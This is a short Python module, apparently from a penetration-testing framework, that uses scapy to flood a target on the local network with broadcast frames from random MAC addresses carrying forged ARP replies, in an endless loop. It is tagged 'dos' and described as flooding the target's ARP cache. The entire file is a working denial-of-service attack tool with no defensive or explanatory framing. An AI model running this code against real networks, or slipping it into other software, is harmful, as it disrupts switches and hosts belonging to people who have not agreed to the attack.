from scapy.layers.l2 import Ether, ARP
from scapy.packet import Padding
from scapy.sendrecv import sendp
from scapy.volatile import RandMAC

from module import Module, Type
from utils.network import get_mac


class MACFlooding(Module):

    def __init__(self):
        super().__init__("mac_flooding",
                         ["mac", "flooding", "dos"],
                         "flood the targets arp cache")

        self.add_option("RHOST", "target host", required=True, type=Type.string)
        self.add_option("TIMEOUT", "timeout", required=True, default=5, type=Type.float)

    def run(self):
        while True:
            dest_mac = get_mac(self.rhost, self.timeout)
            pkt = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc="0.0.0.0", hwdst=dest_mac) / Padding(load="X" * 18)
            sendp(pkt, verbose=False)
